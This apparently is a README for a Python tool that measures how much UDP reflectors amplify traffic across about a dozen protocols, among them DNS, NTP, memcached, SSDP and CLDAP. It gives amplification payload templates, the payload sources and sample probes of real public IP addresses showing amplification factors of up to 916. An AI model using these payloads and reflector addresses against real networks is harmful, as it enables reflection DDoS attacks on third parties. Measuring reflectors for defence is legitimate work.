# ddos_reflection DDoS反射源(放大器）放大倍数计算
  - BAF: bandwidth amplification factor 带宽放大倍数 
  - PAF: packet amplification factor 包数放大倍数

# python3

# 反射探测规则模版

支持3种格式的反射载荷

## 1. hexstream 实例
```
    'arms': {
        'service': 'arms',
        'protocol': 'net Assistant Apple Remote Desktop', #协议描述
        'port_list': [ # 反射端口
            3283,
        ],
        'payload_list': [ #反射摘荷
            '00140000',
        ],
        'ip_list': [ # 反射器
            '5.226.69.3'
        ],
    },

```
## 2. bytes 实例
```
    'stun': {
        'service': 'stun',
        'protocol': 'Session Traversal Utilities for NAT',
        'port_list': [
            3478
        ],
        'payload_list': [
            b"\x00\x03\x00\x00!\x12\xa4B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
        ],
        'ip_list': [
            '46.44.248.126',
        ],
    },
```

## 3. 文本 实例
```
    'ssdp': {
        'service': 'ssdp',
        'protocol': 'Simple Service Discovery Protocol',
        'port_list': [
            1900,
        ],
        'payload_list': [
            "M-SEARCH * HTTP/1.1\r\n" \
            "HOST: 239.255.255.250:1900\r\n" \
            "MAN: \"ssdp:discover\"\r\n" \
            "MX: 2\r\n" \
            "ST: ssdp:all\r\n\r\n",
        ],
        'ip_list': [
            '212.253.131.81',
        ],
    },
```

# 已知UDP反射的实例集：
## 实例1： 对dns协议的反射探测，探测84.22.46.54:53，服务存活，带宽放大倍数130.13

```
python3 ref_probe.py --proto=dns --ip=84.22.46.54  --port=53
{
    "ref_server": "84.22.46.54",
    "ref_port": 53,
    "ref_resp_pkts": 1,
    "ref_resp_bytes": 4034,
    "ref_req_bytes": 31,
    "baf": 130.13,
    "paf": 1,
    "ref_service": "dns"
}

```

使用dig+指定域名进行DNS服务器反射倍数探测

```
python3 ref_probe.py --proto=dns --is_dig --domain=sl --ip=84.22.46.54  --port=53
{
    "ref_server": "84.22.46.54",
    "ref_port": 53,
    "ref_resp_pkts": 1,
    "ref_resp_bytes": 4033,
    "ref_req_bytes": 31,
    "baf": 130.1,
    "paf": 1
}

```

## 实例2: 对ntp协议的反射探测，探测183.213.30.129:123，服务存活，带宽放大倍数916.67, 包数放大倍数100

```
python3 ref_probe.py --proto=ntp  --ip=183.213.30.129 --port=123
{
    "ref_server": "183.213.30.129",
    "ref_port": 123,
    "ref_resp_pkts": 100,
    "ref_resp_bytes": 44000,
    "ref_req_bytes": 48,
    "baf": 916.67,
    "paf": 100,
    "ref_service": "ntp"
}

```

## 实例3：对ssdp协议的反射探测，探测212.253.131.81:1900，服务存活，带宽放大倍数65.93

```
python3 ref_probe.py --proto=ssdp --ip=212.253.131.81 --port=1900
{
    "ref_server": "212.253.131.81",
    "ref_port": 1900,
    "ref_resp_pkts": 22,
    "ref_resp_bytes": 6197,
    "ref_req_bytes": 94,
    "baf": 65.93,
    "paf": 22,
    "ref_service": "ssdp"
}

```

## 实例4：对memcache协议的反射探测，探测5.39.93.111:11211，服务存活，带宽放大倍数251.5

```
python3 ref_probe.py --proto=memcache --ip=5.39.93.111 --port=11211
{
    "ref_server": "5.39.93.111",
    "ref_port": 11211,
    "ref_resp_pkts": 1,
    "ref_resp_bytes": 1169,
    "ref_req_bytes": 15,
    "baf": 77.93,
    "paf": 1,
    "ref_service": "memcache"
}

```



## 实例5：对arms协议的反射探测, 探测5.226.69.3:3283，服务存活，带宽放大倍数251.5

```
python3 ref_probe.py --proto=arms --ip=5.226.69.3 --port=3283
{
    "ref_server": "5.226.69.3",
    "ref_port": 3283,
    "ref_resp_pkts": 1,
    "ref_resp_bytes": 1006,
    "ref_req_bytes": 4,
    "baf": 251.5,
    "paf": 1,
    "ref_service": "arms"
}

```

## 实例6：对cldap协议的反射探测, 探测216.238.77.34:389，服务存活，带宽放大倍数78.41

```
python3 ref_probe.py --proto=cldap --ip=216.238.77.34 --port=389

{
    "ref_server": "216.238.77.34",
    "ref_port": 389,
    "ref_resp_pkts": 1,
    "ref_resp_bytes": 3058,
    "ref_req_bytes": 39,
    "baf": 78.41,
    "paf": 1,
    "ref_service": "cldap"
}

```

## 实例7：对snmp协议的反射探测, 探测68.171.218.123:161，服务存活，带宽放大倍数42.59

```
python3 ref_probe.py --proto=snmp --ip=68.171.218.123 --port=161
{
    "ref_server": "68.171.218.123",
    "ref_port": 161,
    "ref_resp_pkts": 1,
    "ref_resp_bytes": 1448,
    "ref_req_bytes": 34,
    "baf": 42.59,
    "paf": 1,
    "ref_service": "snmp"
}

```

## 实例8：对coap_over_gatt协议的反射探测, 探测58.176.163.242:56666，服务存活，带宽放大倍数49.33

```
python3 ref_probe.py --proto=coap_over_gatt --ip=58.176.163.242 --port=56666
{
    "ref_server": "58.176.163.242",
    "ref_port": 56666,
    "ref_resp_pkts": 1,
    "ref_resp_bytes": 1036,
    "ref_req_bytes": 21,
    "baf": 49.33,
    "paf": 1,
    "ref_service": "coap_over_gatt"
}
```

## 实例8：对coap协议的反射探测, 探测103.98.119.97:5683，服务存活，带宽放大倍数46.81
```
python3 ref_probe.py --proto=coap --ip=103.98.119.97 --port=5683
{
    "ref_server": "103.98.119.97",
    "ref_port": 5683,
    "ref_resp_pkts": 1,
    "ref_resp_bytes": 983,
    "ref_req_bytes": 21,
    "baf": 46.81,
    "paf": 1,
    "ref_service": "coap"
}
```

## 实例9： 对DVR DHCPDiscover 协议的反射探测, 探测98.190.136.25:37810，服务存活，带宽放大倍数170.0

```
python3 ref_probe.py --proto=dhcpdiscover --ip=98.190.136.25 --port=37810
{
    "ref_server": "98.190.136.25",
    "ref_port": 37810,
    "ref_resp_pkts": 1,
    "ref_resp_bytes": 680,
    "ref_req_bytes": 4,
    "baf": 170.0,
    "paf": 1,
    "ref_service": "dhcpdiscover"
}

```

## 实例10： 对Hikvision device discover via SADP over SSH 协议的反射探测, 探测121.188.186.254:37020，服务存活，带宽放大倍数26.11

```
python3 ref_probe.py --proto=sadp --ip=121.188.186.254 --port=37020
{
    "ref_server": "121.188.186.254",
    "ref_port": 37020,
    "ref_resp_pkts": 1,
    "ref_resp_bytes": 966,
    "ref_req_bytes": 37,
    "baf": 26.11,
    "paf": 1,
    "ref_service": "sadp"
}

```

## 实例11： Jenkins (Hudson Agent) CI Server Discovery （CVE-2020-2100）协议的反射探测, 探测85.214.104.48:33848，服务存活，带宽放大倍数166.0

```
python3 ref_probe.py --proto=jenkins --ip=85.214.104.48 --port=33848         
{
    "ref_server": "85.214.104.48",
    "ref_port": 33848,
    "ref_resp_pkts": 1,
    "ref_resp_bytes": 166,
    "ref_req_bytes": 1,
    "baf": 166.0,
    "paf": 1,
    "ref_service": "jenkins"
}

```

## 实例12：对stun协议的反射探测, 探测46.44.248.126:3478，服务存活，带宽放大倍数7.2

```
python3 ref_probe.py --proto=stun --ip=46.44.248.126 --port=3478
{
    "ref_server": "46.44.248.126",
    "ref_port": 3478,
    "ref_resp_pkts": 1,
    "ref_resp_bytes": 144,
    "ref_req_bytes": 20,
    "baf": 7.2,
    "paf": 1,
    "ref_service": "stun"
}

```

## 实例13: 对wsdp(soap ws-discovery ONVIF)协议的反射探测, 探测71.8.137.246:3702，服务存活，带宽放大倍数8.44
```
{
    "ref_server": "71.8.137.246",
    "ref_port": 3702,
    "ref_resp_pkts": 1,
    "ref_resp_bytes": 1477,
    "ref_req_bytes": 175,
    "baf": 8.44,
    "paf": 1,
    "ref_service": "wsdp"
}
```

# 未知反射探测
```
python3 ref_probe.py --proto=unknown --port=7777 --payload=ff --ip=95.31.20.140


```

# 放大载荷由以下渠道获取
- 攻击包
- [AMP-Research](https://github.com/Phenomite/AMP-Research) 